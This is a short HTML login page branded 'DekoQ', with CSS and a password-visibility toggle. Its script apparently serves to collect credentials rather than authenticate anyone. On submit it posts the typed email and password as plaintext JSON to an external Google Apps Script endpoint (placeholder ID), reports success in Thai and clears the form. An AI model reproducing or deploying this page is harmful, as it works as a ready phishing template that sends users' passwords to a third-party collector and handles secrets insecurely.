<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }
    .container h1 {
      font-size: 3rem;
      margin: 0;
    }
    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }
    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 360px;
      min-height: 340px;
    }
    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
      display: block;
    }
    .input-group {
      position: relative;
      width: 100%;
      margin-bottom: 1.2rem;
      height: 48px;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      height: 100%;
      font-size: 1rem;
      padding: 0 2.5rem 0 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      line-height: 1.2;
    }
    .toggle-eye {
      position: absolute;
      top: 0;
      right: 10px;
      height: 100%;
      width: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
    }
    .toggle-eye svg {
      width: 22px;
      height: 22px;
      fill: #333;
    }
    button[type="submit"] {
      width: 100%;
      height: 48px;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
      margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <div class="input-group">
          <input type="email" id="email" name="email" required placeholder="Value" />
        </div>

        <label for="password">Password</label>
        <div class="input-group">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <button type="button" class="toggle-eye" onclick="togglePassword()" aria-label="Toggle Password">
            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.238-5-5s2.238-5 
              5-5 5 2.238 5 5-2.238 5-5 5zm0-8c-1.657 0-3 
              1.343-3 3s1.343 3 3 3 3-1.343 
              3-3-1.343-3-3-3z"/>
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    function togglePassword() {
      const pwdInput = document.getElementById("password");
      const eyeIcon = document.getElementById("eyeIcon");
      const isVisible = pwdInput.type === "text";
      pwdInput.type = isVisible ? "password" : "text";

      eyeIcon.innerHTML = isVisible
        ? `<path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 
        0-5-2.238-5-5s2.238-5 5-5 5 2.238 5 5-2.238 
        5-5 5zm0-8c-1.657 0-3 1.343-3 
        3s1.343 3 3 3 3-1.343 3-3-1.343-3-3-3z"/>`
        : `<path d="M2.293 2.293l1.414 1.414A11.839 11.839 0 0 0 1 12s3.367 7 11 
        7c2.133 0 4.07-.532 5.707-1.414l1.414 1.414 
        1.414-1.414L3.707 2.293 2.293 
        3.707zM5.83 7.244l1.542 1.542A4.978 4.978 0 
        0 0 7 12c0 2.761 2.239 5 5 
        5a4.978 4.978 0 0 0 3.214-1.119l1.471 
        1.471A9.978 9.978 0 0 1 12 
        19C6.813 19 3.324 14.809 2.207 12a9.993 
        9.993 0 0 1 3.623-4.756zM9.243 
        10.657l4.1 4.1A2.997 2.997 0 0 1 12 
        15c-1.657 0-3-1.343-3-3 0-.373.066-.729.186-1.057z"/>`;
    }

    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/YOUR_SCRIPT_ID_HERE/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(async (response) => {
          const text = await response.text();
          console.log("Raw response text:", text);
          if (response.ok) {
            alert("ส่งข้อมูลสำเร็จแล้ว!");
            form.reset();
          } else {
            alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          }
        })
        .catch((error) => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Fetch Error!", error);
        });
    });
  </script>
</body>
</html>
